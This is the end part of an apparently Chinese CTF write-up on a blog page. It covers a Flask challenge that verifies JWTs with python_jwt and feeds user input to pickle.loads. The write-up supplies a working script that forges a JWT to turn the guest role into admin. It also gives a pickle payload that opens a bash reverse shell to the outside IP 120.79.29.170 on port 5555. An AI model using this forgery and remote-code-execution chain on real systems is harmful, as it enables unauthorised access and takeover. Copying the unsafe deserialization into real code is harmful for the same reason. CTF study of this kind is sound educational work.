+<span class="token keyword">from</span> python_jwt <span class="token keyword">import</span> <span class="token operator">*</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">generate_random_string</span><span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits  <span class="token comment"># 包含字母和数字</span>
+    random_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>characters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> random_string
+
+
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
+key <span class="token operator">=</span> jwk<span class="token punctuation">.</span>JWK<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>kty<span class="token operator">=</span><span class="token string">'RSA'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        token <span class="token operator">=</span> verify_jwt<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'PS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">=</span> token<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>
+        user <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"boogipop"</span><span class="token punctuation">,</span> <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">}</span>
+        jwt <span class="token operator">=</span> generate_jwt<span class="token punctuation">(</span>user<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token string">'PS256'</span><span class="token punctuation">,</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> jwt
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/pickle"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">unser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
+        pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"pickle"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string">'success'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'fail'</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+</code></pre> 
+<blockquote> 
+ <p>题目的思路也是十分简单，通过伪造JWT，使得返回来的fake_payload中第二部分的role和admin，然后进行pickle反序列化即可。</p> 
+</blockquote> 
+<ol><li>利用原题目guest的jwwt直接进行伪造，绕过身份验证</li></ol> 
+<p><img src="https://images2.imgbox.com/77/06/2a3RHG11_o.png" alt="file"></p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> json <span class="token keyword">import</span> loads<span class="token punctuation">,</span> dumps
+<span class="token keyword">from</span> jwcrypto<span class="token punctuation">.</span>common <span class="token keyword">import</span> base64url_encode<span class="token punctuation">,</span> base64url_decode
+
+
+<span class="token keyword">def</span> <span class="token function">topic</span><span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token punctuation">[</span>header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> topic<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
+    parsed_payload <span class="token operator">=</span> loads<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>parsed_payload<span class="token punctuation">)</span>
+    parsed_payload<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    fake_payload <span class="token operator">=</span> base64url_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>fake_payload<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'{" '</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fake_payload <span class="token operator">+</span> <span class="token string">'.":"","protected":"'</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'", "payload":"'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'","signature":"'</span> <span class="token operator">+</span> signature <span class="token operator">+</span> <span class="token string">'"} '</span>
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>topic<span class="token punctuation">(</span><span class="token string">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTkzNjkyMzcsImlhdCI6MTY5OTM2NTYzNywianRpIjoiTUV0SEJKX1JZeVR3MmhnUmZMcnFsdyIsIm5iZiI6MTY5OTM2NTYzNywicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.nw0s5c4lL0GtUBb7IJTbIhVTE7kzNg7s4l93PrhWZmYKuxWCyZmi7cKWE63Tv3Z6sdUQVp_7IlM8yiY32mNSOwRHCADWllFo18bmlXVri_qdWR-CCVkVi6npIliEBXl_Hbpnh64dCIQuY13-gr0Y412svenGADO-uubqxT3Ml7dlpnaDZ7F06ISkg_m4syc0DQpKKuQv4xFshMYHgaxCCkLpJCMHScIxSjSjoxpD3LnNjYRXgVue8R4TcZ75ZWgaSmkNUmHUrizdTFyi0GVutnaT1Nw4yZKkS5DZxAVUYqcARLUSGvWmt1pZnyny0eR23q7Z8X7Mw-LytE-XfmkAFQ'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+</code></pre> 
+<ol start="2"><li>这里返回的session就是admin的session</li></ol> 
+<p><img src="https://images2.imgbox.com/0a/50/9vOdYTfx_o.png" alt="file"></p> 
+<ol start="3"><li>触发pickle反序列化，反弹shell</li></ol> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> base64
+
+p<span class="token operator">=</span><span class="token string">b"(cos\nsystem\nS'bash -c \"bash -i &gt;&amp; /dev/tcp/120.79.29.170/5555 0&gt;&amp;1\"'\no"</span>
+payload<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+</code></pre> 
+<p><img src="https://images2.imgbox.com/fd/4b/gMGxIc5e_o.png" alt="file"></p> 
+<h2><a id="_321"></a>总结</h2> 
+<p>JWT的话题总是不息的，包括一些空认证等，nodejs中的数组绕过等等，漏洞也是频出。</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/3f1586311eb934324bc712611e198d0b/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">AFE芯片做什么用的？AFE（Analog Front End） 模拟前端</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/8a58e109f9e9c7e23cbefedff1f1b5c4/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Unable to make field private final java.lang.String java.io.File.path accessible: module java.base d</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程学习者.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
